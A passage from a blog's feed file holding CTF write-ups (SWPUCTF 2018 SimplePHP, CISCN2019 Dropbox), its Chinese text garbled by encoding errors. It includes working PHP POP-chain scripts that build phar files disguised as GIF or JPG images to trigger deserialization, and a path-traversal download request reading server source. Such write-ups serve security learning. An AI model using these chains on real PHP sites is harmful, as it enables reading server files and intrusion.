&#125;&#125;?&gt;</code></pre><p>é¦–å…ˆè§‚å¯Ÿæ•æ„Ÿå‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°äº†file_get_contents()ï¼Œå¦‚ä½•åˆ©ç”¨å®ƒå‘¢ï¼Œæˆ‘ä»¬å°è¯•å¯»æ‰¾å¯ä»¥ååºåˆ—çš„ç‚¹ã€‚</p><p>ä½†æ˜¯æœ¬æ–‡ä¸­å¹¶æ²¡unserializeï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é‡‡ç”¨phar://åè®®ï¼Œå¯ä»¥è¾¾åˆ°ååºåˆ—åŒ–çš„æ•ˆæœã€‚</p><p>ä¸‹é¢æˆ‘ä»¬å°±è¦è€ƒè™‘ï¼Œå¦‚ä½•åˆ©ç”¨file_get_contens()è¿™ä¸ªæ•æ„Ÿå‡½æ•°ã€‚</p><p>ååºåˆ—åŒ–ï¼Œæœ€é‡è¦çš„å°±ç®—é‡Œé¢çš„ä¸€äº›é­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>__toString  åœ¨echoä¸€ä¸ªç±»çš„æ—¶å€™è°ƒç”¨</p><p>__get   æœªå®šä¹‰çš„å±æ€§æˆ–æ²¡æœ‰æƒé™è®¿é—®çš„å±æ€§è¢«è®¿é—®æ—¶è¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨</p><p>ä¸‹é¢æˆ‘ä»¬æ¥å°è¯•æ„å»ºpopåˆ©ç”¨é“¾ã€‚</p><p>æˆ‘ä»¬å…¨å±€æœç´¢$valueè¿™ä¸ªå˜é‡ï¼Œå‘ç°å®ƒæ˜¯ç”±getç©¿è¿‡æ¥çš„</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220543645.png" alt="image-20211107220543645"></p><p> æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>ä½¿$valueå¯æ§ï¼</p><p>æˆ‘ä»¬å†å…¨å±€æœç´¢$keyå¹¶æ²¡æœ‰å‘ç°å¯ä»¥ä¼ å…¥çš„åœ°æ–¹ï¼Œé‚£ä¹ˆè¯´æ˜å®ƒä¸å—æˆ‘ä»¬æ§åˆ¶ã€‚</p><p>é‚£æˆ‘ä»¬å°±è¦çªç ´è¿™ä¸ªç‚¹ã€‚</p><p>å¦‚ä½•æ„é€ ï¼Œä½¿å®ƒå—æˆ‘ä»¬æ§åˆ¶ã€‚</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220958104.png" alt="image-20211107220958104"></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼š</p><p>å½“æˆ‘ä»¬åœ¨Test()è¿™ä¸ªç±»ä¸­è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™å°±ä¼šè°ƒç”¨å®ƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥ä¼ å…¥æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•è°ƒç”¨Test()å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼š</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221351753.png" alt="image-20211107221351753"></p><p>Test()ç±»ä¸­ä¸å­˜åœ¨sourceï¼Œæˆ‘ä»¬å¯ä»¥ä»¤str[â€˜strâ€™] = new Test() æ¥è°ƒç”¨ã€‚</p><p>è€Œè°ƒç”¨__toStringï¼Œåˆéœ€è¦echoè¿™ä¸ªç±»</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™é‡Œ</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221800425.png" alt="image-20211107221800425"></p><p>å¥½äº†ï¼Œä¸Šé¢æˆ‘ä»¬éƒ½æ˜¯é€†æ¨ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥ç†ä¸€ä¸‹popé“¾çš„é¡ºåºã€‚</p><p>è°ƒç”¨C1e4r()ä¸­çš„é­”æœ¯æ–¹æ³•__destruct  â€”â€”-    è°ƒç”¨Show()ä¸­çš„ toString()  â€”â€”â€”     ä¼ å…¥Testè°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§ä»è€Œè°ƒç”¨ get</p><p>popé“¾ä»£ç å¦‚ä¸‹:</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a = new C1e4r();$b = new Show();$c = new Test();$a-&gt;str = $b;$b-&gt;str[&#39;str&#39;] = $c; //å› ä¸ºè¿™é‡Œä¼šè°ƒç”¨source,ä»è€Œä¼šè°ƒç”¨ä¸‹è¾¹çš„sourceï¼Œæ‰€ä»¥ä¸‹è¾¹çš„paramsä¹Ÿè¦æ¥å—$source$this-&gt;params[$source] = &#39;/var/www/html/f1ag.php&#39;;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering(); //å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;</code></pre><p>æ”¾åœ¨æœ¬åœ°ç¯å¢ƒï¼Œè®¿é—®ï¼Œä¼šç”Ÿæˆä¸€ä¸ªsakura.pharæ–‡ä»¶</p><p>å‘ç°æ— æ³•ä¸Šä¼ ï¼Œå°†åç¼€æ”¹ä¸º.gif</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223436308.png" alt="image-20211107223436308"></p><p>ä¸Šä¼ åã€‚</p><p>è®¿é—®</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E5%90%8D">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/uploadå¯ä»¥è·å¾—æ–‡ä»¶å</a></p><p>ç„¶ååˆ©ç”¨pharè§£æ</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg</a></p><p>è·å¾—flag</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223535835.png" alt="image-20211107223535835"></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223555802.png" alt="image-20211107223555802"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> pharåè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 ååŒ—èµ›åŒº Day1 Web1 Dropbox _0x41-0x4F</title>
      <link href="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/"/>
      <url>/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®ç»™å‡ºçš„æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶ä¸”æœ‰æ³¨å†Œæ“ä½œ</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005613695.png" alt="image-20211028005613695"></p><p>æˆ‘ä»¬å¯ä»¥å…ˆæ³¨å†Œä¸ªè´¦å·ç™»å½•ä¸‹</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005651708.png" alt="image-20211028005651708"></p><p>æœ‰ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼Œå°è¯•æ–‡ä»¶ä¸Šä¼ ï¼Œå‘ç°å†™æ­»äº†ï¼Œåªå…è®¸å›¾ç‰‡ä¸Šä¼ ã€‚</p><p>é‚£æˆ‘ä»¬å…ˆä¸Šä¼ ä¸ªå›¾ç‰‡çœ‹ä¸€çœ‹</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005810078.png" alt="image-20211028005810078"></p><p>å¢åŠ äº†ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸‹è½½å’Œåˆ é™¤</p><p>æŠ“åŒ…æ¥çœ‹ä¸€çœ‹</p><pre><code>POST /download.php HTTP/1.1Host: dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 26Origin: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81Connection: closeReferer: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81/index.phpCookie: UM_distinctid=17ba73558f3490-0c95ed277ed4498-4c3f217f-144000-17ba73558f4710; PHPSESSID=ad225e350fb42f426122effecd7c8b7cfilename=w5w.jpg</code></pre><p>è¿™é‡Œæœ‰ä¸ªå…³é”®ç‚¹filename=w5w.jpgï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å°†w5w.jpgæ”¹ä¸ºåˆ«çš„æ–‡ä»¶åç§°</p><p>é¦–å…ˆæ”¹ä¸º ../../index.php</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011042791.png" alt="image-20211028011042791"></p><p>æˆåŠŸè¯»å–åˆ°äº†index.phpçš„æºç ã€‚</p><p>è¿™æ—¶å€™å°è¯•ç›²çŒœè·¯å¾„è¯»å–flagï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç»“æœã€‚é‚£å°±è¯»å–ä¸‹å…¶ä»–æºç çœ‹ä¸€çœ‹å§</p><p>ä¾æ¬¡è¯»å–äº†</p><p>index.php,download.php,delete.php,class.php</p><p>index.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>è¿™ä¸ªé‡Œé¢æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿</p><p>class.php</p><pre><code class="php">&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db = $db;    &#125;    public function user_exist($username) &#123;        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        if ($count === 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect === $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files = array();        $this-&gt;results = array();        $this-&gt;funcs = array();        $filenames = scandir($path);        $key = array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key = array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file = new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] = array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;;        &#125;        $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;;        $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename =&gt; $result) &#123;            $table .= &#39;&lt;tr&gt;&#39;;            foreach ($result as $func =&gt; $value) &#123;                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;            &#125;            $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#39;;            $table .= &#39;&lt;/tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename = $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size = filesize($this-&gt;filename);        $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>å¾ˆå¤šå‡½æ•°ï¼Œæœ€å…³é”®çš„æ˜¯æˆ‘ä»¬å‘ç°äº† file_get_contents,è¿™åº”è¯¥æ˜¯é¢˜ç›®çš„çªç ´ç‚¹</p><p>download.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;    Header(&quot;Content-type: application/octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°flagè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯æ— æ³•ç›´æ¥è¯»å–flagçš„</p><p>delete.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œç›¸åº”ä¹Ÿå­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ã€‚è¿™é‡Œçš„æ„æ€ä¸è¿‡è¿”å›Trueä¸Falseï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„åœ°æ–¹ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®¡è®¡ä¸€ä¸‹ä»£ç ã€‚</p><p>åˆ©ç”¨ç‚¹ï¼š</p><pre><code class="php">public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;</code></pre><p>çœ‹ä¸€ä¸‹å“ªäº›åœ°æ–¹è°ƒç”¨äº†closeå‡½æ•°</p><p>download.phpä¸­çš„</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011750225.png" alt="image-20211028011750225"></p><p>class.phpçš„userç±»é‡Œé¢å­˜åœ¨</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p><p>è¿™é‡Œæ‰§è¡Œçš„å®é™…æ˜¯å…³é—­æ•°æ®åº“çš„æ“ä½œï¼Œä½†æ˜¯æœ‰è¶£çš„æ˜¯å®ƒå’Œæˆ‘ä»¬éœ€è¦è°ƒç”¨çš„å‡½æ•°é‡åã€‚</p><p>download.phpå­˜åœ¨è¿‡æ»¤ï¼Œæ— æ³•ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ä½¿ç”¨class.phpä¸­çš„é­”æœ¯æ–¹æ³•__destruct()æ¥è°ƒç”¨</p><p>å¦‚ä½•è°ƒç”¨__destruct()é­”æœ¯æ–¹æ³•å‘¢ï¼Œä¹Ÿå°±æ˜¯å¦‚ä½•è°ƒç”¨å¯¹è±¡å‘¢ï¼Œå¿…é¡»ä½¿ç”¨ååºåˆ—åŒ–</p><p>ä½†æ˜¯æ•´ä¸ªä»£ç ä¸­å¹¶æ²¡æœ‰å‡ºç°è¿‡unserialize()è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥è¿›è¡Œåºåˆ—åŒ–ã€‚</p><p>è¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨phar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ.</p><p>å…³äºpharçš„è®²è§£å¯ä»¥çœ‹å¦å¤–ä¸€ç¯‡åšå®¢ï¼š</p><p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>å®¡è®¡ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸ªå¾ˆæœ‰è¶£çš„é­”æœ¯æ–¹æ³•ï¼š</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028012434528.png" alt="image-20211028012434528"></p><p>å®ƒåœ¨ä»€ä¹ˆæ—¶å€™è°ƒç”¨å‘¢ï¼Ÿ</p><p>è¿™ä¸ªæ–¹æ³•ç”¨æ¥ç›‘è§†ä¸€ä¸ªå¯¹è±¡ä¸­çš„å…¶å®ƒæ–¹æ³•ã€‚å¦‚æœä½ è¯•ç€è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œ__call æ–¹æ³•å°†ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</p><p>è¿™é‡Œ__callçš„ä»£ç çš„æ„æ€å°±æ˜¯å¦‚æœè°ƒç”¨çš„å¯¹è±¡ä¸å­˜åœ¨ï¼Œå°±ä¼šæŠŠè¿™ä¸ªå‡½æ•°å†™å…¥$this-&gt;funcs,å¹¶ä¸”éå†æ–‡ä»¶ï¼Œè®©æ¯ä¸€ä¸ªæ–‡ä»¶æ‰§è¡Œä¸€éè¿™ä¸ªå‡½æ•°ã€‚</p><p>å› æ­¤æˆ‘ä»¬çš„æ€è·¯å°±æ¸…æ™°äº†ä¸€ç‚¹ã€‚</p><p>é¦–å…ˆååºåˆ—åŒ–ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»ä¸å­˜åœ¨close()æ–¹æ³•(å¦‚æœå­˜åœ¨çš„è¯å°±ä¸éœ€è¦è¿™ä¹ˆå¤æ‚äº†)ï¼Œç„¶åå¯¹è¿™ä¸ªç±»è°ƒç”¨close()æ–¹æ³•ï¼Œå› ä¸ºå®ƒä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨__callé­”æœ¯æ–¹æ³•ï¼Œcallé­”æœ¯æ–¹æ³•å°±å¯ä»¥è°ƒç”¨closeæ–¹æ³•ï¼Œä»è€Œå®Œæˆfile_get_contentså‡½æ•°çš„åˆ©ç”¨ã€‚</p><p>æ‰€ä»¥æ“ä½œå°±æ˜¯ï¼š</p><p>ååºåˆ—åŒ–$user</p><p>è°ƒç”¨å®Œæˆï¼Œå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œè°ƒç”¨å‡½æ•°__destructé­”æœ¯æ–¹æ³•</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p><p>ä½¿$user -&gt; db = FileList()</p><p>FileListè¿™ä¸ªç±»è°ƒç”¨close(),ä¸å­˜åœ¨ï¼Œè°ƒç”¨__callæ–¹æ³•ï¼Œè°ƒç”¨close()</p><p>æ¥ä¸‹æ¥å°±å¯ä»¥æ¥æ„å»ºpopé“¾ï¼š</p><pre><code class="php">&lt;?phpclass User &#123;public $db;public function __construct() &#123;        $this-&gt;db = new FileList();    &#125;&#125;class FileList &#123;        private $files;    private $results;    private $funcs;    public function __construct() &#123;        $this-&gt;files = array(new File());        $this-&gt;results = array();        $this-&gt;funcs = array();    &#125;&#125;class File &#123;    public $filename = &#39;/flag.txt&#39;;&#125;$user = new User;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering(); //å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub$phar-&gt;setMetadata($user); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;</code></pre><p>è¿è¡Œå¾—åˆ°sakura.pharæ–‡ä»¶ï¼Œä¿®æ”¹åç¼€ä¸ºsakura.jpgï¼Œä¸Šä¼ </p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014454461.png" alt="image-20211028014454461"></p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014549020.png" alt="image-20211028014549020"></p><p>è®¿é—®delete.php</p><p>æ³¨æ„ä¸ºä»€ä¹ˆä¸è®¿é—®download.phpæ¥å®è¡Œæ”»å‡»ï¼Ÿ</p><p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªç»†èŠ‚ï¼š</p><p>download.phpä¸­å­˜åœ¨</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014231785.png" alt="image-20211028014231785"></p><p>ini_set(â€œopen_basedirâ€, getcwd() . â€œ:/etc:/tmpâ€); è¿™ä¸ªå‡½æ•°æ‰§è¡Œåï¼Œæˆ‘ä»¬é€šè¿‡Webåªèƒ½è®¿é—®å½“å‰ç›®å½•ã€/etcå’Œ/tmpä¸‰ä¸ªç›®å½•ï¼Œæ‰€ä»¥åªèƒ½åœ¨delete.phpä¸­åˆ©ç”¨payloadï¼Œè€Œä¸æ˜¯download.phpï¼Œå¦åˆ™è®¿é—®ä¸åˆ°æ²™ç®±å†…çš„ä¸Šä¼ ç›®å½•ã€‚</p><p>è®¿é—®delete.php,ä½¿ç”¨pharè¿›è¡Œååºåˆ—åŒ–ï¼ŒæˆåŠŸå¾—åˆ°flag</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014632248.png" alt="image-20211028014632248"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pharååºåˆ—åŒ–æ¼æ´</title>
      <link href="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
